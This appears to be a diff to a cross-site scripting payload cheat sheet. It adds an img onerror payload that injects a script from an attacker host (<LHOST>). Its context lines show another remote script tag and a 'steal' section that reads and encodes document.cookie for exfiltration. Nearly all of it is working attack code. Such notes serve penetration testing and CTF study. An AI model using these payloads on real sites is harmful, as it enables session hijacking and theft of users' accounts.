@@ -4,6 +4,9 @@
 echo "alert(1)" > xss.js
 <script src="http://<LHOST>/xss.js"></script>
 
+# remote dom img example
+<img src="invalid-image" onerror="var script = document.createElement('script'); script.src='http://<LHOST>/xss.js'; document.body.appendChild(script);" />
+
 # steal
 let cookie = document.cookie
 let encodedCookie = encodeURIComponent(cookie)
